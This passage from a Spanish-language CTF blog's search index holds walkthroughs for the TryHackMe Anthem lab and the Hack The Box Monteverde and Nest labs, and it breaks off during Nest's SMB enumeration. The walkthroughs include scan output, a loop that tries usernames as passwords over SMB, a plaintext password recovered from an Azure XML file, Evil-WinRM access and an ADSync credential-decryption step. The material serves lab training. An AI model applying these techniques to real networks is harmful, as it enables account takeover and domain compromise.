(Status: 302) /robots.txt (Status: 200) /robots.txt (Status: 200) /rss (Status: 200) /RSS (Status: 200) /search (Status: 200) /Search (Status: 200) /sitemap (Status: 200) /SiteMap (Status: 200) /tags (Status: 200) /umbraco (Status: 200)   Encontramos en el archivo robots.txt direcciones que no aparecen en GOBUSTER, además encontramos una frase que posiblemente sea util.\nVisitamos /umbranco y encontramos un panel de inicio de sesion, pero aun no tenemos credenciales.\nEn uno de los Posts de la pagina, encontramos un correo, que nos podria servir para encontrar otros.\nIntentamos utilizar el correo junto a la frase que encontramos pero no funcionó en /umbranco. En una de las pistas del CTF nos dice que utilicemos nuestro buscador favorito, pero ¿qué vamos a buscar?.\nDentro de uno de los posts encontramos un poema, al buscar este poema en internet encontramos un nombre del que parece ser el autor de este.\nAutor\nUNBRANCO Con esto, logramos encontrar el nombre del administrador y el correo (con el patron Jose Lopez -\u0026gt; JL@dominio.com). Intentamos utilizar el correo con la frase encontrada en /umbranco y logramos obtener acceso.\nLa version de Umbraco es 7.15.4 por lo que no encontramos un exploit que pudiera ayudarnos a tener acceso en la maquina.\nRDP - USER Intentamos mediante el servicio RDP con las credenciales y logramos acceder mediante este.\nInstalacion de Remmina:\n1  apt install remmina   Logramos obtener una sesion y la flag user.txt.\nADMINISTRATOR - USER Teniendo una sesion en la maquina buscamos informacion que pudiera ayudarnos a escalar privilegios, no encontramos binarios, archivos o servicios en los cuales apoyarnos. Pero, al revisar las carpetas nos damos cuenta que no esta activada la opcion de que permite ver archivos ocultos. La activamos y encontramos un archivo en el directorio principal del disco.\nAl intentar abrir el archivo nos muestra un mensaje de que no tenemos permisos.\nVemos las propiedades del archivo y vemos que no tiene ningun grupo o usuario permitido escribir, leer o modificar. Agregamos nuestro usuario al archivo. Escribimos el nombre de nuestro usuario y damos Check Names y automaticamente lo agrega con el nombre del equipo.\nAplicamos y vemos que nuestro usuario tiene todos los permisos permitidos.\nAbrimos el archivo, logramos leer el archivo y vemos una frase dentro.\nAgregamos una nueva conexion al servicio RDP pero con el usuario administrator y con la frase que encontramos.\nLogramos obtener una sesion y nuestra flag root.txt.\nFLAGS EXTRA FLAG 1 La encontramos en el primer post.\nFLAG 2 La flag la encontramos en el codigo fuente de la pagina.\nFLAG 3 La encontramos en el perfil de Jane Doe.\nFLAG 4 Encontramos la flag en el segundo post.\n","description":"","id":21,"section":"posts","tags":["windows"],"title":"TryHackMe - Anthem","uri":"https://sckull.github.io/posts/anthem/"},{"content":"Monteverde es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Monteverde     OS Windows   Puntos 30   Dificultad Media   IP 10.10.10.172   Maker egre55    NMAP Escaneo de puertos tcp/udp y servicios con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Sat Jan 18 18:57:43 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.172 Nmap scan report for 10.10.10.172 Host is up (0.26s latency). Not shown: 65517 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-01-19 01:11:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49669/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49670/tcp open msrpc Microsoft Windows RPC 49671/tcp open msrpc Microsoft Windows RPC 49702/tcp open msrpc Microsoft Windows RPC 49775/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=1/18%Time=5E23AA58%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 10m36s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-01-19T01:14:10 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jan 18 19:05:11 2020 -- 1 IP address (1 host up) scanned in 448.85 seconds   ENUM4LINUX Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.\ntarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jan 18 19:15:47 2020 ========================== | Target Information | ========================== Target ........... 10.10.10.172 RID Range ........ 500-550,1000-1050 Username ......... \u0026#39;\u0026#39; Password ......... \u0026#39;\u0026#39; Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== | Enumerating Workgroup/Domain on 10.10.10.172 | ==================================================== [E] Can\u0026#39;t find workgroup/domain ============================================ | Nbtstat Information for 10.10.10.172 | ============================================ Looking up status of 10.10.10.172 No reply from 10.10.10.172 ===================================== | Session Check on 10.10.10.172 | ===================================== [+] Server 10.10.10.172 allows sessions using username \u0026#39;\u0026#39;, password \u0026#39;\u0026#39; [+] Got domain/workgroup name: =========================================== | Getting domain SID for 10.10.10.172 | =========================================== Domain Name: MEGABANK Domain Sid: S-1-5-21-391775091-850290835-3566037492 [+] Host is part of a domain (not a workgroup) ====================================== | OS information on 10.10.10.172 | ====================================== [+] Got OS info for 10.10.10.172 from smbclient: [+] Got OS info for 10.10.10.172 from srvinfo: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED ============================= | Users on 10.10.10.172 | ============================= index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2\tName: AAD_987d7f2f57d2\tDesc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos\tName: Dimitris Galanos\tDesc: (null) index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest\tName: (null)\tDesc: Built-in account for guest access to the computer/domain index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope\tName: Mike Hope\tDesc: (null) index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary\tName: Ray O\u0026#39;Leary\tDesc: (null) index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs\tName: SABatchJobs\tDesc: (null) index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan\tName: Sally Morgan\tDesc: (null) index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata\tName: svc-ata\tDesc: (null) index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec\tName: svc-bexec\tDesc: (null) index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp\tName: svc-netapp\tDesc: (null) user:[Guest] rid:[0x1f5] user:[AAD_987d7f2f57d2] rid:[0x450] user:[mhope] rid:[0x641] user:[SABatchJobs] rid:[0xa2a] user:[svc-ata] rid:[0xa2b] user:[svc-bexec] rid:[0xa2c] user:[svc-netapp] rid:[0xa2d] user:[dgalanos] rid:[0xa35] user:[roleary] rid:[0xa36] user:[smorgan] rid:[0xa37] ========================================= | Share Enumeration on 10.10.10.172 | ========================================= Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.10.172 ==================================================== | Password Policy Information for 10.10.10.172 | ==================================================== [+] Attaching to 10.10.10.172 using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] MEGABANK [+] Builtin [+] Password Info for Domain: MEGABANK [+] Minimum password length: 7 [+] Password history length: 24 [+] Maximum password age: 41 days 23 hours 53 minutes [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: 1 day 4 minutes [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set [+] Retieved partial password policy with rpcclient: Password Complexity: Disabled Minimum Password Length: 7 ============================== | Groups on 10.10.10.172 | ============================== [+] Getting builtin groups: group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] group:[RDS Remote Access Servers] rid:[0x23f] group:[RDS Endpoint Servers] rid:[0x240] group:[RDS Management Servers] rid:[0x241] group:[Hyper-V Administrators] rid:[0x242] group:[Access Control Assistance Operators] rid:[0x243] group:[Remote Management Users] rid:[0x244] group:[Storage Replica Administrators] rid:[0x246] [+] Getting builtin group memberships: Group \u0026#39;IIS_IUSRS\u0026#39; (RID: 568) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Guests\u0026#39; (RID: 546) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Incoming Forest Trust Builders\u0026#39; (RID: 557) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Pre-Windows 2000 Compatible Access\u0026#39; (RID: 554) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Windows Authorization Access Group\u0026#39; (RID: 560) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Remote Management Users\u0026#39; (RID: 580) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Users\u0026#39; (RID: 545) has member: Couldn\u0026#39;t lookup SIDs [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44d] group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f] group:[ADSyncAdmins] rid:[0x451] group:[ADSyncOperators] rid:[0x452] group:[ADSyncBrowse] rid:[0x453] group:[ADSyncPasswordSet] rid:[0x454] [+] Getting local group memberships: Group \u0026#39;ADSyncAdmins\u0026#39; (RID: 1105) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Denied RODC Password Replication Group\u0026#39; (RID: 572) has member: Couldn\u0026#39;t lookup SIDs [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Group Policy Creator Owners] rid:[0x208] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[DnsUpdateProxy] rid:[0x44e] group:[Azure Admins] rid:[0xa29] group:[File Server Admins] rid:[0xa2e] group:[Call Recording Admins] rid:[0xa2f] group:[Reception] rid:[0xa30] group:[Operations] rid:[0xa31] group:[Trading] rid:[0xa32] group:[HelpDesk] rid:[0xa33] group:[Developers] rid:[0xa34] [+] Getting domain group memberships: Group \u0026#39;HelpDesk\u0026#39; (RID: 2611) has member: MEGABANK\\roleary Group \u0026#39;Trading\u0026#39; (RID: 2610) has member: MEGABANK\\dgalanos Group \u0026#39;Operations\u0026#39; (RID: 2609) has member: MEGABANK\\smorgan Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\Administrator Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\AAD_987d7f2f57d2 Group \u0026#39;Azure Admins\u0026#39; (RID: 2601) has member: MEGABANK\\mhope Group \u0026#39;Domain Guests\u0026#39; (RID: 514) has member: MEGABANK\\Guest Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\Administrator Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\krbtgt Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\AAD_987d7f2f57d2 Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\mhope Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\SABatchJobs Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-ata Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-bexec Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\svc-netapp Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\dgalanos Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\roleary Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\smorgan Group \u0026#39;Group Policy Creator Owners\u0026#39; (RID: 520) has member: MEGABANK\\Administrator ======================================================================= | Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================= [E] Couldn\u0026#39;t get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible. ============================================= | Getting printer info for 10.10.10.172 | ============================================= Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED enum4linux complete on Sat Jan 18 19:19:29 2020   Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar a entrar en la maquina.\nSMBMAP Utilizamos la lista de usuarios junto con smbmap para verificar que alguno de ellos tenga permisos en alguno de los SHARENAMEs de la maquina utilizando el nombre de usuario como contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  root@aoiri:~/htb/monteverde# while read USER; do echo $USER \u0026amp;\u0026amp; smbmap -H 10.10.10.172 -u $USER -p \u0026#34;$USER\u0026#34;; done \u0026lt; users.txt roleary [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 dgalanos [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 smorgan [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 AAD_987d7f2f57d2 [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 mhope [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 Guest [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172 SABatchJobs [+] Finding open SMB ports.... [+] User SMB session established on 10.10.10.172... [+] IP: 10.10.10.172:445\tName: 10.10.10.172 Disk Permissions\tComment ---- -----------\t------- ADMIN$ NO ACCESS\tRemote Admin . dr--r--r-- 0 Fri Jan 3 06:43:36 2020\t. dr--r--r-- 0 Fri Jan 3 06:43:36 2020\t.. azure_uploads READ ONLY\tC$ NO ACCESS\tDefault share E$ NO ACCESS\tDefault share . fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tInitShutdown fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tlsass fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tntsvcs fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tscerpc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-3b4-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tepmapper fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-1ec-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tLSM_API_service fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teventlog fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-488-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tatsvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-6a4-0 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\twkssvc fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-294-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-294-1 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\49669 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\teddf3645116af5dd fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tRpcProxy\\593 fr--r--r-- 4 Sun Dec 31 17:57:56 1600\tsrvsvc fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tspoolss fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-b54-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tnetdfs fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tvgauth-service fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-280-0 fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tW32TIME_ALT fr--r--r-- 3 Sun Dec 31 17:57:56 1600\tSQLLocal\\MSSQLSERVER fr--r--r-- 2 Sun Dec 31 17:57:56 1600\tsql\\query fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-ba0-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tCPFATP_6024_v4.0.30319 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132240333070920024.6024.DefaultAppDomain.miiserver fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tGoogleCrashServices\\S-1-5-18 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tGoogleCrashServices\\S-1-5-18-x64 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tWinsock2\\CatalogChangeListener-bac-0 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132240367071490977.1628.DefaultAppDomain.wsmprovhost IPC$ READ ONLY\tRemote IPC . dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t.. NETLOGON READ ONLY\tLogon server share . dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\t.. dr--r--r-- 0 Thu Jan 2 16:05:27 2020\tMEGABANK.LOCAL SYSVOL READ ONLY\tLogon server share . dr--r--r-- 0 Fri Jan 3 07:12:48 2020\t. dr--r--r-- 0 Fri Jan 3 07:12:48 2020\t.. dr--r--r-- 0 Fri Jan 3 07:15:23 2020\tdgalanos dr--r--r-- 0 Fri Jan 3 07:41:18 2020\tmhope dr--r--r-- 0 Fri Jan 3 07:14:56 2020\troleary dr--r--r-- 0 Fri Jan 3 07:14:28 2020\tsmorgan users$ READ ONLY\tsvc-ata [+] Finding open SMB ports.... svc-bexec [+] Finding open SMB ports.... [!] Authentication error on 10.10.10.172 [!] Authentication error on 10.10.10.172   Vemos que el usuario SABatchJobs tiene permisos de Lectura en azure_uploads y users$.\nUSER mhope - Azure PSADPasswordCredential  Utilizamos las credenciales para enumerar users$ con smbclient, encontramos un archivo de azure que contiene la contraseña en texto plano en un archivo de XML.\nroot@aoiri:~/htb/monteverde# smbclient \\\\\\\\10.10.10.172\\\\users$ -U SABatchJobs Enter WORKGROUP\\SABatchJobs's password: Try \u0026quot;help\u0026quot; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Fri Jan 3 07:12:48 2020 .. D 0 Fri Jan 3 07:12:48 2020 dgalanos D 0 Fri Jan 3 07:12:30 2020 mhope D 0 Fri Jan 3 07:41:18 2020 roleary D 0 Fri Jan 3 07:10:30 2020 smorgan D 0 Fri Jan 3 07:10:24 2020 524031 blocks of size 4096. 519955 blocks available smb: \\\u0026gt; cd mhope smb: \\mhope\\\u0026gt; dir . D 0 Fri Jan 3 07:41:18 2020 .. D 0 Fri Jan 3 07:41:18 2020 azure.xml AR 1212 Fri Jan 3 07:40:23 2020 524031 blocks of size 4096. 519955 blocks available smb: \\mhope\\\u0026gt; get azure.xml getting file \\mhope\\azure.xml of size 1212 as azure.xml (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec) smb: \\mhope\\\u0026gt; exit root@aoiri:~/htb/monteverde# cat azure.xml ��\u0026lt;Objs Version=\u0026quot;1.1.0.1\u0026quot; xmlns=\u0026quot;http://schemas.microsoft.com/powershell/2004/04\u0026quot;\u0026gt; \u0026lt;Obj RefId=\u0026quot;0\u0026quot;\u0026gt; \u0026lt;TN RefId=\u0026quot;0\u0026quot;\u0026gt; \u0026lt;T\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;DT N=\u0026quot;StartDate\u0026quot;\u0026gt;2020-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; \u0026lt;DT N=\u0026quot;EndDate\u0026quot;\u0026gt;2054-01-03T05:35:00.7562298-08:00\u0026lt;/DT\u0026gt; \u0026lt;G N=\u0026quot;KeyId\u0026quot;\u0026gt;00000000-0000-0000-0000-000000000000\u0026lt;/G\u0026gt; \u0026lt;S N=\u0026quot;Password\u0026quot;\u0026gt;4n0therD4y@n0th3r$\u0026lt;/S\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; Credenciales: mhope:4n0therD4y@n0th3r$ EvilWinRm  Ya que el puerto de winrm esta abierto utilizamos las credenciales que tenemos junto con evilwinrm, obtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos whoami /all para ver los permisos, grupos y privilegios que el usuario tiene.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  *Evil-WinRM* PS C:\\Users\\mhope\\Documents\u0026gt; whoami /all USER INFORMATION ---------------- User Name SID ============== ============================================ megabank\\mhope S-1-5-21-391775091-850290835-3566037492-1601 GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group MEGABANK\\Azure Admins Group S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======= SeMachineAccountPrivilege Add workstations to domain Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled USER CLAIMS INFORMATION ----------------------- User claims unknown. Kerberos support for Dynamic Access Control on this device has been disabled. *Evil-WinRM* PS C:\\Users\\mhope\\Documents\u0026gt;   Vemos que mhope pertenece al grupo de Azure Admins, despues de investigar acerca de este grupo encontramos un post de XPN que explica como se puede obtener la contraseña y usario desde la base de datos del catalogo de ADSync de azure.\nAzureAd - RedTeam\nUtilizamos el script azuread_decrypt_msol que viene adjunto al post, modificandolo para que pueda hacer el query a la base de datos local.\n1  $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList \u0026#34;Data Source = localhost; Initial Catalog=ADSync; Trusted_Connection=True\u0026#34;   Utilizamos las credenciales en evil-winrm obtuvimos una shell y nuestra flag root.txt.\n","description":"","id":22,"section":"posts","tags":["windows","azureAD"],"title":"Hack The Box - Monteverde","uri":"https://sckull.github.io/posts/monteverde/"},{"content":"Nest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Nest     OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.178   Maker VbScrub    MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-29 04:56:39 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 4386/tcp on 10.10.10.178 Discovered open port 445/tcp on 10.10.10.178 # Nmap 7.80 scan initiated Tue Jan 28 22:23:24 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.178 Nmap scan report for 10.10.10.178 Host is up (0.34s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR \u0026lt;Directory_Name\u0026gt; | RUNQUERY \u0026lt;Query_ID\u0026gt; | DEBUG \u0026lt;Password\u0026gt; |_ HELP \u0026lt;Command\u0026gt; ... [snip] ... Host script results: |_clock-skew: 1m15s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-29T04:29:38 |_ start_date: 2020-01-29T03:11:05 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 28 22:29:02 2020 -- 1 IP address (1 host up) scanned in 338.05 seconds   SMBCLIENT Listamos los SHARENAMES de la maquina, vemos que existe Data, Secure$ y Users, en los cuales tenemos acceso.\n1 2 3 4 5 6 7 8 9 10 11 12  root@aoiri:~/htb/nest# smbclient -L 10.10.10.178 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share Data Disk IPC$ IPC Remote IPC Secure$ Disk Users Disk SMB1 disabled -- no workgroup available   Utilizamos el SHARENAME Data con un usuario \u0026lsquo;anonimo\u0026rsquo; y sin contraseña para enumerar los archivos, encontramos dentro de Shared dos archivos de texto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  root@aoiri:~/htb/nest# smbclient \\\\\\\\10.10.10.178\\\\Data Enter WORKGROUP\\root\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Wed Aug 7 16:53:46 2019 .. D 0 Wed Aug 7 16:53:46 2019 IT D 0 Wed Aug 7 16:58:07 2019 Production D 0 Mon Aug 5 15:53:38 2019 Reports D 0 Mon Aug 5 15:53:44 2019 Shared D 0 Wed Aug 7 13:07:51 2019 10485247 blocks of size 4096. 6449704 blocks available smb: \\\u0026gt; cd IT smb: \\IT\\\u0026gt; dir NT_STATUS_ACCESS_DENIED listing 